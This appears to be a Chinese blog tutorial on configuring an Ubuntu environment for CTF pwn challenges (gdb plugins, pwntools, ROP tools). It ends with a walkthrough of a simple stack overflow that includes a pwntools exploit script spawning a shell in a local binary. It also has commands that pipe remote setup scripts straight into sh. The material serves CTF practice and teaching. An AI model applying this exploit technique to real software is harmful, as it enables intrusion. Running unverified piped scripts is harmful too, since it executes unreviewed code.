> 往往我们做pwn题，都是拿到可执行文件(elf)其依赖文件libc.so,工欲善其事必先利其器，利用好的工具，可以事半功倍。在此列出自己做pwn题的虚拟机ubuntu配置，更加期待WSL2上线后，使用docker部署pwn环境做题

主要工具：
`vim` ： 安装插件，为后续编写exploit
`peda` ：gdb插件，调试神器，谁用谁知道
`pwngdb、gef` ：同上
`pwndbg`：GitHub上的一个项目,用于GDB的辅助增强
`pwntools`：常见的pwn漏洞堆溢出、栈溢出、use after free、格式化字符串、命令注入以及竞态(常见于多线程)等程序漏洞，在程序漏洞利用常利用python脚本来编写exploit
Capstone、Binutils...
`rop工具` :ROPgadget、one_gadget，这两个都很好用，one_gadget主要是用来寻找libc文件中的一些shell地址的、ROPgadget则主要是用来构建rop链的，非常实用
`LibcSearcher`:用来泄露libc库中函数的偏移的库

<!-- more -->

## 配置

### VIM

```
wget -qO- https://raw.github.com/ma6174/vim/master/setup.sh | sh -x
```
[详细配置地址](https://github.com/ma6174/vim )

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472525276.png)

### 安装Capstone（反编译框架）

``` gams
~$ git clone https://github.com/aquynh/capstone
~$ cd capstone
~$ make
~$ sudo make install
```
### 安装Binutils（二进制工具集）

``` vim
git clone https://github.com/Gallopsled/pwntools-binutils
sudo apt-get install software-properties-common
sudo apt-add-repository ppa:pwntools/binutils
sudo apt-get update
sudo apt-get install binutils-arm-linux-gnu
```

### 第三方库

在逆向和溢出程序交互时，用得最多的几个第三方库先装好：
```
sudo pip install pwntools
sudo pip install zio
sudo pip install pwn
```
在配置python-pip的过程中遇到了点问题
升级pip==19.1.1后，出现如下报错：
![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472525298.png)

可行的解决方案是修改报错行的代码

``` 
from pip._internal import main
```
ssl验证问题

``` 
　rm -rf /usr/lib/python2.7/dist-packages/OpenSSL
　rm -rf /usr/lib/python2.7/dist-packages/pyOpenSSL-0.15.1.egg-info
　sudo pip install pyopenssl
```
出现checksec无法使用的问题

``` vim
pip3 install git+https://github.com/arthaud/python3-pwntools.git
```

### 安装gdb工具

在调试时有时候需要不同功能，在gdb下需要安装两个工具pwndbg和peda，可惜这两个不兼容

pwndbg在调试堆的数据结构时候很方便

peda在查找字符串等功能时方便

#### peda
``` jboss-cli
git clone https://github.com/longld/peda.git ~/peda

echo "source ~/peda/peda.py" >> ~/.gdbinit

echo "DONE! debug your program with gdb and enjoy"
```
#### pwndbg

``` vim
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```
#### pwngdb

``` vim
cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/
```
#### gef

``` stylus
#via the install script
$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
#manually
$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
$ echo source ~/.gdbinit-gef.py >> ~/.gdbinit
```

我们通过修改`gdbinit`来切换想使用的插件
![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472525084.png)

### ROPgadget

https://github.com/JonathanSalwan/ROPgadget

### one_gadget

``` sql
apt-get install ruby
apt-get install gem
sudo gem install one_gadget
```
### LibcSearcher

``` vim
git clone https://github.com/lieanu/libc.git
cd libc
git submodule update --init --recursive
sudo python setup.py develop
```
## 实例:Pwn分析之栈溢出

![解题思路](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472524627.png)

## 解题步骤  

### 0X01 

反编译得到C伪代码

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable();
  return 0;
}
```
main函数调用vulnerable()函数

vulnerable()函数逆向结果

```
int vulnerable()
{
  char s; // [esp+4h] [ebp-14h]

  gets(&s);
  return puts(&s);
}
```
vulnerable()函数中调用了gets()和puts()函数，而程序的逻辑只运行main函数和vulnerable函数

![所有函数](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472525345.png)

vulnerable函数功能：输入字符串，输出字符串
程序中主要函数有
内置函数：`gets`、`puts`、`system`
自定义函数：`main`、`success`

### 0X02

通过C伪代码最终得到的C代码如下：
```
#include <stdio.h>
#include <string.h>
void success() { 
   puts("You Hava already controlled it.");
   system("/bin/sh");
}
void vulnerable() {
 char s[12];
 gets(s);
 puts(s);
 return;
}
int main(int argc, char **argv) {
 vulnerable();
 return 0;
}
```
gets() 是一个危险函数，因为它不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易导致栈溢出

### 0X03

查看程序的保护机制：

![check](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472525088.png)

输入s的值溢出到返回地址，将返回地址替换成success函数的起始地址

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472524825.png)

EBP与EBP的距离14H，而栈中的EBP占栈内存4H，所以要覆盖到放回地址需要18H

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472525098.png)

编写脚本如下：

```
from pwn import *
sh = process('./Ezreal')
success_addr = 0x080491A2

payload = 'a' * 0x18 + p32(success_addr)
print p32(success_addr)

sh.sendline(payload)

sh.interactive()
```
利用脚本后的栈结构如下：

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472524648.png)

运行脚本，成功拿到shell：

![](https://cdn.jsdelivr.net/gh/qoo3/imgur@master/bookmaker/1589472524647.png)

